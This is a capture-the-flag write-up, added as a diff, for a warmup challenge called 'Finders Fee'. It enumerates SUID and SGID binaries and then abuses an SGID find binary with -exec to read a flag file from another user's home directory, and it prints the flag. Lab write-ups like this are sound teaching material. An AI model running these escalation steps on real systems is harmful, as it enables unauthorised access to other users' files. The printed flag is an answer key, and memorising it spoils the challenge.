@@ -1,0 +1,87 @@
+Name: Finders Fee
+Value: 500 points
+Category: Warmups
+Solves: 3 Solves
+Author: @JohnHammond
+
+Description:
+You gotta make sure the people who find stuff for you are rewarded well!
+
+Escalate your privileges and uncover the flag.txt in the finder user's home directory.
+
+Press the Start button in the top-right to begin this challenge.
+
+Solution:
+
+1. Connect to the server with the credentials provided
+
+2. Execute the provided string to elevate and search for "flag*"
+
+user@finders-fee-0d3880c729888e9c-794d8c6cc-mwc8t:~$ find / -name flag* -exec cat {} \; 2>/dev/null
+0x10000040
+0x10000040
+0x10000040
+0x10000040
+0x1003
+0x9
+flag{5da1de289823cfc200adf91d6536d914}
+
+3. Flag: flag{5da1de289823cfc200adf91d6536d914}
+
+
+Note:
+I run a similar command on all challenges like this, to identify that this would be viable perform the following:
+
+1. Identify SUID/SGID binaries
+
+# find / -perm -4000 2>/dev/null
+
+user@finders-fee-27c62b75e584c914-6df8cb96f5-g5gdt:~$ find / -perm -4000 2>/dev/null
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/umount
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/mount
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/su
+
+
+# find / -perm -2000 2>/dev/null
+
+user@finders-fee-27c62b75e584c914-6df8cb96f5-g5gdt:~$ find / -perm -2000 2>/dev/null
+/usr/sbin/pam_extrausers_chkpwd
+/usr/sbin/unix_chkpwd
+/usr/bin/chage
+/usr/bin/expiry
+/usr/bin/find <---- FOUND FIND
+/usr/bin/ssh-agent
+/var/mail
+/var/log/journal
+/var/local
+
+2. Abuse -exec with find
+
+# find / -name flag* -exec cat {} \; 2>/dev/null <-- Wildcard Search the System for "Flag"
+# find /root -exec cat /root/flag.txt \; <-- Targeted Search of User Dir
+
+user@finders-fee-27c62b75e584c914-6df8cb96f5-g5gdt:~$ find /home/finder -exec ls /home/finder/ \;
+flag.txt
+flag.txt
+flag.txt
+flag.txt
+flag.txt
+
+3. We've identified flag.txt in the directory for finder, now let's cat it
+
+# find /home/finder -exec cat /home/finder/flag.txt \;
+
+user@finders-fee-27c62b75e584c914-6df8cb96f5-g5gdt:~$ find /home/finder -exec cat /home/finder/flag.txt \;
+flag{5da1de289823cfc200adf91d6536d914}
+flag{5da1de289823cfc200adf91d6536d914}
+flag{5da1de289823cfc200adf91d6536d914}
+flag{5da1de289823cfc200adf91d6536d914}
+flag{5da1de289823cfc200adf91d6536d914}
+
